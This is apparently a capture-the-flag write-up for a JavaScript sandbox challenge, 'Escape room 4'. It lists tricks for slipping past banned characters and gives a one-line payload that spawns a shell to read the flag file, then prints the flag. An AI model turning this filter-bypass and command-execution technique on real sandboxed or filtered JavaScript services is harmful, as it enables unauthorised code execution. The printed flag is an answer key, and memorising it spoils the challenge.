# Escape room 4

## Write-up

To bypass the restrictions you can:
 - Use two backticks instead of `()` to call functions
 - Keep the arguments in the correct order with `bind`
 - Use `something["some_name"]` instead of `something.some_name` to access properties
 - Use backticks instead of `"` or `'` to create strings
 - And we do not need numbers

```javascript
console[`log`][`bind`]`${require[`bind`]`${`child_process`}```[`spawnSync`][`bind`]`${`cat flag*`},${{shell:true}}```[`stdout`][`toString`]`utf8`}```
```

## Flag

`flag-108a55858ba2f0a498fb14666bab109f`
